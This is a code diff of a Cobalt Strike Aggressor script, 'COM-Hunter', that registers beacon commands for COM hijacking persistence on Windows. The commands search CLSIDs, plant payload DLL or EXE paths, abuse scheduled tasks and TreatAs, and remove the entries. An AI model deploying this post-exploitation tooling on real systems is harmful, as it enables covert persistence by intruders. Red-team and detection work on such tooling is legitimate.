@@ -1,4 +1,10 @@
-# com_hunter_search.cna
+# COM-Hunter.cna
+# COM Hijacking BOFs for Cobalt Strike
+# By @nickvourd
+
+# ============================================
+# com_hunter_search
+# ============================================
 
 beacon_command_register(
     "com_hunter_search",
@@ -19,7 +25,8 @@ beacon_command_register(
     "Examples:\n" .
     "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0      Search all in both hives\n" .
     "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2    InprocServer32 in HKCU only\n" .
-    "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1    LocalServer32 in HKLM only"
+    "  com_hunter_search {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1    LocalServer32 in HKLM only",
+    "bof"
 );
 
 sub showHelp_search {
@@ -116,7 +123,9 @@ alias com_hunter_search {
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-# com_hunter_persist.cna
+# ============================================
+# com_hunter_persist
+# ============================================
 
 beacon_command_register(
     "com_hunter_persist",
@@ -131,7 +140,8 @@ beacon_command_register(
     "  1 = LocalServer32 (for EXE payloads)\n\n" .
     "Examples:\n" .
     "  com_hunter_persist {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} C:\\Windows\\Temp\\payload.dll 0\n" .
-    "  com_hunter_persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\\Windows\\Temp\\payload.exe 1"
+    "  com_hunter_persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\\Windows\\Temp\\payload.exe 1",
+    "bof"
 );
 
 sub showHelp_persist {
@@ -149,20 +159,6 @@ sub showHelp_persist {
     berror($bid, "Examples:");
     berror($bid, "  com_hunter_persist {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} C:\\Windows\\Temp\\payload.dll 0");
     berror($bid, "  com_hunter_persist AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 C:\\Windows\\Temp\\payload.exe 1");
-}
-
-# Normalize CLSID - add braces if missing
-sub normalizeCLSID {
-    local('$clsid');
-    $clsid = $1;
-    
-    # Check if already has braces
-    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
-        return $clsid;
-    }
-    
-    # Add braces
-    return "{" . $clsid . "}";
 }
 
 alias com_hunter_persist {
@@ -211,7 +207,9 @@ alias com_hunter_persist {
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-# com_hunter_tasksch.cna
+# ============================================
+# com_hunter_tasksch
+# ============================================
 
 beacon_command_register(
     "com_hunter_tasksch",
@@ -228,7 +226,8 @@ beacon_command_register(
     "  1 = LocalServer32 (for EXE payloads)\n\n" .
     "Examples:\n" .
     "  com_hunter_tasksch C:\\Windows\\Temp\\payload.dll 0\n" .
-    "  com_hunter_tasksch C:\\Windows\\Temp\\payload.exe 1"
+    "  com_hunter_tasksch C:\\Windows\\Temp\\payload.exe 1",
+    "bof"
 );
 
 sub showHelp_tasksch {
@@ -292,7 +291,9 @@ alias com_hunter_tasksch {
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-# com_hunter_remove.cna
+# ============================================
+# com_hunter_remove
+# ============================================
 
 beacon_command_register(
     "com_hunter_remove",
@@ -313,7 +314,8 @@ beacon_command_register(
     "Examples:\n" .
     "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0      Remove all from both hives\n" .
     "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2    Remove InprocServer32 from HKCU\n" .
-    "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1    Remove LocalServer32 from HKLM"
+    "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1    Remove LocalServer32 from HKLM",
+    "bof"
 );
 
 sub showHelp_remove {
@@ -337,18 +339,6 @@ sub showHelp_remove {
     berror($bid, "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 0");
     berror($bid, "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 1 2");
     berror($bid, "  com_hunter_remove {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} 2 1");
-}
-
-# Normalize CLSID - add braces if missing
-sub normalizeCLSID {
-    local('$clsid');
-    $clsid = $1;
-    
-    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
-        return $clsid;
-    }
-    
-    return "{" . $clsid . "}";
 }
 
 alias com_hunter_remove {
@@ -410,7 +400,9 @@ alias com_hunter_remove {
     beacon_inline_execute($1, $data, "go", $args);
 }
 
-# com_hunter_treatas.cna
+# ============================================
+# com_hunter_treatas
+# ============================================
 
 beacon_command_register(
     "com_hunter_treatas",
@@ -430,7 +422,8 @@ beacon_command_register(
     "  1 = LocalServer32 (for EXE payloads)\n\n" .
     "Examples:\n" .
     "  com_hunter_treatas {hijack-clsid} {spoof-clsid} C:\\payload.dll 0\n" .
-    "  com_hunter_treatas {hijack-clsid} {spoof-clsid} C:\\payload.exe 1"
+    "  com_hunter_treatas {hijack-clsid} {spoof-clsid} C:\\payload.exe 1",
+    "bof"
 );
 
 sub showHelp_treatas {
@@ -451,18 +444,6 @@ sub showHelp_treatas {
     berror($bid, "Examples:");
     berror($bid, "  com_hunter_treatas {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5} {11111111-1111-1111-1111-111111111111} C:\\payload.dll 0");
     berror($bid, "  com_hunter_treatas AB8902B4-09CA-4bb6-B78D-A8F59079A8D5 11111111-1111-1111-1111-111111111111 C:\\payload.exe 1");
-}
-
-# Normalize CLSID - add braces if missing
-sub normalizeCLSID {
-    local('$clsid');
-    $clsid = $1;
-    
-    if (left($clsid, 1) eq "{" && right($clsid, 1) eq "}") {
-        return $clsid;
-    }
-    
-    return "{" . $clsid . "}";
 }
 
 alias com_hunter_treatas {
